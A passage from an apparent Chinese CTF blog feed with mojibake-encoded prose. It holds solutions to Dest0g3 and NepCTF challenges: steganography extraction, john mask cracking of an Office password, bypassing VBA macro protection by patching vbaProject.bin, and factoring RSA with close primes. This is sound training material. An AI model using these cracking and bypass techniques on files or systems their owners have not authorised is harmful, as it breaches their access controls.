class="number">23</span>                      <span class="comment">//è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦æ»¡è¶³23</span></span><br><span class="line">    &amp;&amp; *v4 == <span class="string">&#x27;N&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">2</span>] == <span class="string">&#x27;p&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">3</span>] == <span class="string">&#x27;C&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">4</span>] == <span class="string">&#x27;T&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">5</span>] == <span class="string">&#x27;F&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">6</span>] == <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">22</span>] == <span class="string">&#x27;&#125;&#x27;</span> )               <span class="comment">//è¾“å…¥å­—ç¬¦ä¸²æ»¡è¶³å‰ç¼€NepCTF&#123;ï¼Œåç¼€æ»¡è¶³&#125;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_54B6E4 )</span><br><span class="line">        sub_459750(v1, v3);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">7</span>) &gt;= <span class="number">0x17</span> )</span><br><span class="line">        sub_459750(v1, v3);</span><br><span class="line">      <span class="keyword">if</span> ( v4[i + <span class="number">7</span>] != *(_BYTE *)(dword_54B6E0 + i) )     <span class="comment">//å°†è¾“å…¥å’Œdword_54B6E0æ¯”è¾ƒ</span></span><br><span class="line">      &#123;</span><br><span class="line">        v9[<span class="number">0</span>] = (<span class="keyword">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">        v9[<span class="number">1</span>] = (<span class="keyword">int</span>)&amp;off_4D2334;</span><br><span class="line">        unknown_libname_61((<span class="keyword">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="keyword">int</span>)v9, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v8[<span class="number">0</span>] = (<span class="keyword">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">    v8[<span class="number">1</span>] = (<span class="keyword">int</span>)&amp;off_4D233C;</span><br><span class="line">    unknown_libname_61((<span class="keyword">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="keyword">int</span>)v8, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10[<span class="number">0</span>] = (<span class="keyword">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">    v10[<span class="number">1</span>] = (<span class="keyword">int</span>)&amp;off_4D2334;</span><br><span class="line">    unknown_libname_61((<span class="keyword">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="keyword">int</span>)v10, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>v4[i + 7] != *(_BYTE *)(dword_54B6E0 + i)</code> æ¯”è¾ƒå¤„ä¸‹æ–­ç‚¹åŠ¨è°ƒï¼ŒæŸ¥çœ‹ <code>dword_54B6E0</code> å­˜æ”¾çš„å€¼ä¸º <code>U9eT_t0_th3TRUE</code>ï¼Œæ•…flagä¸º<code>NepCTF&#123;U9eT_t0_th3TRUE&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>èœã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;â€œNepCTF 2022â€æ˜¯ç”±Nepnepè”åˆç«™é˜Ÿä¸»åŠçš„å…¬ç›Šæ‹›æ–°èµ›äº‹ï¼Œæ—¨åœ¨ä»¥æœ‰ä»£è¡¨æ€§ã€æœ‰ç‰¹è‰²çš„é¢˜ç›®åŸ¹å…»æ–°ç”Ÿç½‘ç»œå®‰å…¨èƒ½åŠ›ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”èµ›æ—¶é—´ï¼š2022å¹´7æœˆ15æ—¥10:00 - 2022å¹´7æœˆ17æ—¥10:00ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”èµ›å½¢å¼ï¼šä¸ªäººè§£é¢˜</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022èµ›" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>Dest0g3 520è¿æ–°èµ›</title>
    <link href="https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/</id>
    <published>2022-05-26T12:09:18.000Z</published>
    <updated>2022-05-28T14:17:41.878Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>é¦–å±ŠDest0g3 520è¿æ–°èµ›æ›´åŠ æ³¨é‡CTFerçš„åŸºç¡€çŸ¥è¯†é¢æŒæ¡ç¨‹åº¦ï¼Œç”±æ˜“åˆ°éš¾ï¼Œé€‚åˆå„å­¦ä¹ é˜¶æ®µé€‰æ‰‹å‚åŠ ï¼Œçº¯èŒæ–°æ°´å‡†ã€‚</p><p>æ¯”èµ›æ—¶é—´ï¼š2022.5.20 10:00 - 5.27 10:00</p><p>é¢˜ç›®åˆ†ç±»ï¼šWebã€Pwnã€Miscã€Cryptoã€Reã€AIã€BlockChain</p><p>é¢˜ç›®éš¾åº¦ï¼šèŒæ–°</p><p>æ¯”èµ›ç±»å‹ï¼šä¸ªäººèµ›</p><p>æ¯”èµ›äº¤æµQQç¾¤ï¼š923945203</p><p>ä¸ªäººèµ›å¥–åŠ±ï¼šæ€»æ¦œå‰10åŠå„æ–¹å‘å‰ä¸‰å‡å¯è·å¾—ã€Šä»0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹ä¸€æœ¬ + å®šåˆ¶Uç›˜ï¼ˆ32Gï¼‰ä¸€ä¸ª</p><p>Rank: 12</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Welcome-to-fxxking"><a href="#Welcome-to-fxxking" class="headerlink" title="Welcome to fxxking"></a>Welcome to fxxking</h3><blockquote><p>å…³æ³¨å…¬ä¼—å·å¹¶å›å¤ï¼šGive me the fxxking flag</p></blockquote><p>å…¬ä¼—å· <code>Dest0g3 Team</code> å›å¤ï¼šGive me the fxxking flagï¼Œ</p><p>å¾—åˆ° <code>The fxxking flag is: Dest0g3&#123;W31c0m3_t0_DestCTF2022!&#125;</code></p><p>â€‹    </p><h3 id="Pngenius"><a href="#Pngenius" class="headerlink" title="Pngenius"></a>Pngenius</h3><p>foremoståˆ†è§£pngå›¾ç‰‡å¾—åˆ°zipå‹ç¼©åŒ…ï¼ŒzstegæŸ¥çœ‹pngå›¾ç‰‡çš„lsbé€šé“å¾—åˆ° <code>Password for zip:Weak_Pas5w0rd</code>ï¼›</p><p>ç”¨å¯†ç  <code>Weak_Pas5w0rd</code> è§£å‹zipå‹ç¼©åŒ…å¾—åˆ°flagï¼š<code>Dest0g3&#123;2908C1AA-B2C1-B8E6-89D1-21B97D778603&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="EasyEncode"><a href="#EasyEncode" class="headerlink" title="EasyEncode"></a>EasyEncode</h3><blockquote><p>Enjoy Decoding</p></blockquote><p>ç”¨ARCHPRçˆ†ç ´zipå‹ç¼©åŒ…å¯†ç å¾—åˆ° <code>100861</code>ï¼ŒæŒ‰ç…§ æ‘©æ–¯å¯†ç -16è¿›åˆ¶-Unicode-Base64 è§£ç å¾—åˆ° <code>Dest0g3&#123;Deoding_1s_e4sy_4_U&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ä½ çŸ¥é“jså—"><a href="#ä½ çŸ¥é“jså—" class="headerlink" title="ä½ çŸ¥é“jså—"></a>ä½ çŸ¥é“jså—</h3><p>æ‰“å¼€flagæ–‡ä»¶å‘ç°æ˜¯wordæ–‡ä»¶/å‹ç¼©åŒ…ï¼Œåœ¨ <code>document.xml</code> ä¸­æ‰¾åˆ°Base64ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œè§£ç å¾—åˆ°brainfuckï¼Œ<a href="https://www.splitbrain.org/services/ook">åœ¨çº¿è§£å¯†</a>å¾—åˆ°16è¿›åˆ¶å­—ç¬¦ä¸² <code>446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</code>ï¼Œè½¬ä¸ºå­—ç¬¦å¾— <code>Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="StrangeTraffic"><a href="#StrangeTraffic" class="headerlink" title="StrangeTraffic"></a>StrangeTraffic</h3><p>Wiresharkæ‰“å¼€å‘ç°æ˜¯Modbusæµé‡ï¼Œåœ¨æµ0å‘ç°åˆ†æ®µBase64å­—ç¬¦ä¸² <code>RGVzdDBnM3</code>ã€<code>szMUE1QkVB</code>ã€<code>Ni1GMjBELU</code>ã€<code>YxOEEtRThF</code>ã€<code>QS0yOUI0Rj</code>ã€<code>I1NzEwOEJ9</code>ï¼Œè¿æ¥è§£ç å¾— <code>Dest0g3&#123;31A5BEA6-F20D-F18A-E8EA-29B4F257108B&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="EasyWord"><a href="#EasyWord" class="headerlink" title="EasyWord"></a>EasyWord</h3><blockquote><p>Let the word tell u</p></blockquote><p>æ ¹æ® <code>hint.txt</code> å¾—çŸ¥ <code>password.docm</code> å¯†ç å…¨å°å†™å­—æ¯ï¼Œä¸”æ»¡è¶³ <code>??q?b?</code>ï¼Œç”¨johnçˆ†ç ´ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">office2john password.docm &gt; hash.txt</span><br><span class="line">john --mask=<span class="string">&#x27;?l?lq?lb?l&#x27;</span> hash.txt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¯†ç  <code>ulqsbt</code>ï¼›</p><p>æ‰“å¼€å‘ç°å­˜åœ¨å®ï¼ŒæŸ¥çœ‹å®ä»£ç æœ‰å¯†ç ï¼Œå‚è€ƒ<a href="https://blog.csdn.net/qq_44768749/article/details/102673212">ç±»ä¼¼é¢˜ç›®</a>ä¸­ç ´è§£å®å¯†ç çš„æ–¹æ³•ï¼Œå°†wordæ–‡ä»¶ç”¨å‹ç¼©åŒ…æ–¹å¼æ‰“å¼€ï¼Œæ‰¾åˆ° <code>vbaProject.bin</code> æ–‡ä»¶ä»¥16è¿›åˆ¶æ–¹å¼æŸ¥çœ‹ï¼Œå°† <code>DBP</code> æ”¹ä¸º <code>DBX</code> å¹¶ä¿å­˜ï¼Œå†å°†ä¿®æ”¹åçš„æ–‡ä»¶æ›¿æ¢åˆ°å‹ç¼©åŒ…é‡Œï¼Œæ”¹å›wordæ–‡ä»¶æ ¼å¼ï¼Œé‡æ–°æ‰“å¼€å¯çœ‹åˆ°å®ä»£ç ã€‚</p><p>è¿›å…¥VBAç¼–è¾‘å™¨æŸ¥çœ‹Dialogå¯¹åº”å®ä»£ç ï¼š</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> CB_OK_Click()</span><br><span class="line"><span class="keyword">Dim</span> strpasw <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> strdec <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> strusrinput <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> t <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">t = ChrW(<span class="number">21152</span>) &amp; ChrW(<span class="number">27833</span>) &amp; ChrW(<span class="number">21543</span>) &amp; ChrW(<span class="number">65292</span>) &amp; ChrW(<span class="number">21516</span>) &amp; ChrW(<span class="number">23398</span>) &amp; ChrW(<span class="number">20204</span>) &amp; ChrW(<span class="number">65281</span>)</span><br><span class="line"></span><br><span class="line">strusrinput = Dialog.TextBox_Pasw</span><br><span class="line"><span class="keyword">Dim</span> sinput <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">sinput = strusrinput</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> (strusrinput &lt;&gt; <span class="string">&quot;&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">  strusout = Encode(strusrinput, t)</span><br><span class="line">  <span class="keyword">If</span> (strusout = <span class="string">&quot;â”¤â„¡Ç’qï½˜~&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">      strdec = Decode(Dialog.Label_ls.Caption, sinput)</span><br><span class="line">  <span class="keyword">Else</span></span><br><span class="line">     <span class="keyword">If</span> (strusout = <span class="string">&quot;ï½‹GJEï½‡ï½‘&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">        strdec = Decode(Dialog.Label_ls1.Caption, sinput)</span><br><span class="line">     <span class="keyword">Else</span></span><br><span class="line">          <span class="keyword">If</span> (strusout = <span class="string">&quot;Ğ®ÎŸopz+&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">             strdec = Decode(Dialog.Label_ls2.Caption, sinput)</span><br><span class="line">          <span class="keyword">Else</span></span><br><span class="line">                <span class="keyword">If</span> (strusout = <span class="string">&quot;ï½šÎšjrĞ¨Ï†Îµã‚&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">                    strdec = Decode(Dialog.Label_ls4.Caption, sinput)</span><br><span class="line">                <span class="keyword">Else</span></span><br><span class="line">                    <span class="keyword">If</span> (strusout = <span class="string">&quot;Ã Ç–tï¼µï½—â”§ï½ˆÃ¨&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">                          strdec = Decode(Dialog.Label_ls3.Caption, sinput)</span><br><span class="line">                    <span class="keyword">Else</span></span><br><span class="line">                          strdec = StrConv(t, vbFromUnicode)</span><br><span class="line">                    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">                <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">           <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">      <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">   <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">   Label_CLUE.Caption = strdec</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br></pre></td></tr></table></figure><p>æ— éœ€åˆ†æåŠ è§£å¯†ç®—æ³•ï¼Œè¾“å‡ºç»“æœ <code>strusout</code> ç”± <code>Encode(strusrinput, t)</code> åŠ å¯†å¾—åˆ°ï¼Œåªéœ€åˆ†åˆ«ç”¨è§£å¯†å‡½æ•°åæ¨äº”ä¸ªifåˆ†æ”¯æ¡ä»¶å¯¹åº”çš„æ˜æ–‡å³å¯ï¼Œä¿®æ”¹ <code>Label_CLUE.Caption = strdec</code> ä¸º <code>Label_CLUE.Caption = Decode(xxx,t)</code>ï¼Œå›åˆ°wordè¿è¡Œ <code>AutoOpen</code> å®ï¼Œéšä¾¿è¾“å…¥å­—ç¬¦ç‚¹å‡»ç¡®å®šå³å¯åœ¨Dialogçš„labelå¤„æ˜¾ç¤ºå¯¹åº”æ˜æ–‡ï¼Œåˆ†åˆ«æ˜¯ <code>123456</code>ã€<code>aaaaaa</code>ã€<code>000000</code>ã€<code>å¢™è§’æ•°æ</code>ã€<code>iloveyou</code>ï¼›</p><p>å°† <code>Label_CLUE.Caption = Decode(xxx,t)</code> æ”¹å› <code>Label_CLUE.Caption = strdec</code>ï¼Œåˆ†åˆ«è¾“å…¥äº”æ®µæ˜æ–‡ï¼Œå‘ç°è¾“å…¥ <code>å¢™è§’æ•°æ</code> å¾—åˆ° <code>è§£å‹å¯†ç ï¼šä¸¤åªé»„é¹‚é¸£ç¿ æŸ³,ä¸€è¡Œç™½é¹­ä¸Šé’å¤©!</code>ï¼Œç»“åˆwordé‡Œçš„hint <code>Rarå¯†ç ä¸ºå¤æ‚å‹ï¼Œé•¿åº¦ä¸º16ä½ï¼ŒåŒ…å«äº†å­—æ¯ã€æ•°å­—å’Œç¬¦å·ã€‚</code>ï¼Œå‹ç¼©åŒ…å¯†ç çŒœå‡ºä¸º <code>2zhlmcl,1hblsqt.</code>ï¼Œè§£å‹æ‹¿åˆ°flagï¼š<code>Dest0g3&#123;VBScr1pt_And_Hashc4t_1s_g00d&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="4096"><a href="#4096" class="headerlink" title="4096"></a>4096</h3><blockquote><p>Just relax and always be aware of the changes on the web!</p></blockquote><p>4096å°æ¸¸æˆï¼ŒæŸ¥çœ‹jsï¼Œç”¨chromeæºä»£ç é‡Œçš„æœç´¢åŠŸèƒ½ï¼Œæœ <code>flag</code> å¯åœ¨ <code>local_storage_manager.js</code> é‡Œæ‰¾åˆ°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPartFlag</span>(<span class="params">score</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (score &gt; <span class="number">10000</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Q29uZ3JhdHVsYXRpb25zLCB0aGlzIGlzIHBhcnQgb2YgdGhlIGZsYWc6IE5HVmxOeTFpTmpjekxUazNNV1E0TVdZNFlqRTNOMzA9Lg==&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸¤æ¬¡base64è§£ç å¾—åˆ°flagååŠéƒ¨åˆ† <code>4ee7-b673-971d81f8b177&#125;</code>ã€‚</p><p>å‰åŠéƒ¨åˆ†åœ¨jså†…æ‰¾å¾ˆä¹…éƒ½æ²¡æ‰¾åˆ°ï¼Œè§‚å¯Ÿèµ„æºæ–‡ä»¶é‡Œå­˜åœ¨ <code>favicon.ico</code> å’Œ <code>favicon.png</code> ä¸¤å¼ å›¾ï¼Œå–å‡ºæ¥å‘ç°pngå›¾æœ‰éšå†™ï¼Œforemoståˆ†å‡ºä¸€ä¸ªwavæ–‡ä»¶å’Œä¸€ä¸ªzipæ–‡ä»¶ï¼›</p><p>ç”¨audacityæŸ¥çœ‹wavï¼Œå‰åä¸¤æ®µæ˜¯DTMFæŒ‰é”®éŸ³ï¼Œè§£ç å‡º <code>74958097831</code>ï¼Œä¸­é—´ä¸€æ®µæ˜¯SSTVæ…¢æ‰«æç”µè§†ï¼Œç”¨robot36æ‰«å‡ºå›¾ç‰‡ï¼Œå†…å®¹æ˜¯ <code>MD5&#123;cell phone number&#125;</code>ï¼Œå°†å‰é¢çš„ <code>74958097831</code> å€’åºæˆæ‰‹æœºå·æ ¼å¼ï¼ŒMD5åŠ å¯†å¾—åˆ° <code>32fc1b5487cb447f792a19418b92544e</code>ï¼Œè§£å‹zipå‹ç¼©åŒ…ï¼›</p><p>å‹ç¼©åŒ…é‡Œä¸ºåˆ‡å‰²åæ‰“ä¹±æ‹¼æ¥çš„å›¾ç‰‡ï¼Œåˆ©ç”¨gapså·¥å…·æ‹¼å›¾</p><p><code>gaps --image=puzzle.png --size=64 --save</code></p><p>å¾—åˆ°çš„ç»“æœè¿˜æ˜¯æœ‰éƒ¨åˆ†å—ä½ç½®ä¸å¯¹ï¼Œå†gapsä¸¤æ¬¡å¾—åˆ°å®Œæ•´åŸå›¾ï¼š</p><p><img src="/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/part_flag_solution_solution_solution.jpg" alt="part_flag_solution_solution_solution" style="zoom:50%;"></p><p>å°†å­—ç¬¦ä¸²æ‹¼æ¥å¾— <code>RGVzdDBnM3tlZDRkMTE0Zi05ZWU0LQ==</code>ï¼Œbase64è§£ç å¾—flagå‰åŠæ®µï¼š<code>Dest0g3&#123;ed4d114f-9ee4-</code>ã€‚</p><p>â€‹    </p><h3 id="Python-jail"><a href="#Python-jail" class="headerlink" title="Python_jail"></a>Python_jail</h3><blockquote><p>å¬è¯´pythonæ˜¯æœ€å¥½çš„è¯­è¨€ï¼Œé‚£æˆ‘æŠŠå®ƒé”èµ·æ¥ï¼Œæˆ‘å°±æ˜¯æœ€å¥½çš„è¯­è¨€äº†ï¼</p></blockquote><p>æ ¹æ®hintæç¤ºï¼Œpasswordé‡Œå†…å®¹æ˜¯whitespaceè¯­è¨€ï¼Œ<a href="https://ideone.com/NUNNbI">åœ¨çº¿ç¼–è¯‘</a>å¾—åˆ° <code>a8e15220-7404-4269-812e-6418557b7dc2</code>ï¼Œæ˜¯zipå‹ç¼©åŒ…å¯†ç ï¼›</p><p>è§£å‹zipå‹ç¼©åŒ…ï¼Œzstegå‘ç°lsbéšå†™pycæ–‡ä»¶ï¼Œæå–ï¼š</p><p><code>zsteg -E &quot;b1,rgb,lsb,xy&quot; SECRET1.png &gt; out.pyc</code></p><p>æ— éœ€åç¼–è¯‘ï¼Œ16è¿›åˆ¶æŸ¥çœ‹å‘ç° <code>ZmxhZ3tiNWJjZmM4Ny01Y2E2LTQzZjEtYjM4NC01N2QwOWI4ODZjYTl9</code>ï¼Œbase64è§£ç å¾— <code>flag&#123;b5bcfc87-5ca6-43f1-b384-57d09b886ca9&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="codegame"><a href="#codegame" class="headerlink" title="codegame"></a>codegame</h3><blockquote><p>Funny and ez codegame with Key to celebrate EDG</p></blockquote><p>KEYcodeé‡Œç»æŸ¥æ˜¯LOLCODE Languageï¼Œç”¨dcodeè§£å¾—åˆ°è¾“å‡ºæ˜¯ <code>QEFPFPQEBMXPPTLOA</code>ï¼Œä»¥æ­¤ä¸ºå¯†ç è§£å‹zipå‹ç¼©åŒ…ï¼Œå¾—åˆ°wordæ–‡ä»¶ï¼›</p><p>ç›´æ¥æ‰“å¼€wordå‘ç° <code>AES</code> æç¤ºï¼Œç”¨å‹ç¼©åŒ…æ‰“å¼€wordæœ‰ä¸ª <code>fllllllllll1ag.txt</code> æ–‡ä»¶ï¼Œé‡Œé¢æ˜¯ä¸€ä¸²emojiè¡¨æƒ…ï¼ŒçŒœæƒ³ä¸ºemoji-aesåŠ å¯†ï¼Œ<a href="https://aghorler.github.io/emoji-aes/">åœ¨çº¿è§£å¯†</a>ï¼ŒåŒæ ·ç”¨ <code>QEFPFPQEBMXPPTLOA</code> ä½œä¸ºkeyï¼Œæ²¡æˆåŠŸï¼Œå†ä¸æ–­ç›²è°ƒRotationï¼Œåœ¨Rotationä¸º4çš„æ—¶å€™è§£å¯†æˆåŠŸï¼Œå¾—åˆ°</p><p><code>666C61677B39663638663333342D303137612D343230312D393264662D6464646363313435333334647D</code></p><p>16è¿›åˆ¶è½¬å­—ç¬¦ä¸²å¾— <code>flag&#123;9f68f334-017a-4201-92df-dddcc145334d&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="rookie-hacker-2"><a href="#rookie-hacker-2" class="headerlink" title="rookie hacker-2"></a>rookie hacker-2</h3><blockquote><p>ï¼ˆå®¹å™¨1çš„å®¹å™¨åä¸º <code>test_docker1</code>ï¼Œå®¹å™¨2çš„å®¹å™¨åä¸º <code>test_docker2</code>ï¼‰</p><p>Aliceè®¿é—®è‡ªå·±çš„dockeræ—¶å¿˜è®°äº†æŠŠå®¹å™¨åˆ†åˆ«éƒ¨ç½²åœ¨å“ªäº›ipä¸Šï¼Œä½ èƒ½å¸®å¸®ä»–ä¹ˆï¼Ÿ Flagæ ¼å¼ï¼šDest0g3{ip1_ip2_â€¦..} ä¾‹ï¼šå‡è®¾å®¹å™¨1ã€å®¹å™¨2çš„ipä¸º1.1.1.1ã€2.2.2.2ï¼Œåˆ™flagä¸º Dest0g3{1.1.1.1_2.2.2.2}</p></blockquote><p>éé¢„æœŸï¼Œdockerçš„IPåœ°å€ä¼šä»¥ <code>&quot;IPAddress&quot;: &quot;172.x.x.x&quot;</code> çš„å½¢å¼è®°å½•åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œç›´æ¥åœ¨E01æ–‡ä»¶é‡Œç”¨æ­£åˆ™è¡¨è¾¾å¼ <code>&quot;IPAddress&quot;:&quot;172</code> æœç´¢ï¼Œå–å‡ºç°é¢‘ç‡æœ€é«˜çš„ä¸¤ä¸ªIPå³å¯ï¼Œflagï¼š<code>Dest0g3&#123;172.18.0.2_172.18.0.3&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p*q</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class="line"><span class="string">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>$p,q$ ç›¸è¿‘ï¼Œå¸¸è§„RSAï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">p = iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> is_prime(p):</span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">q = n // p</span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 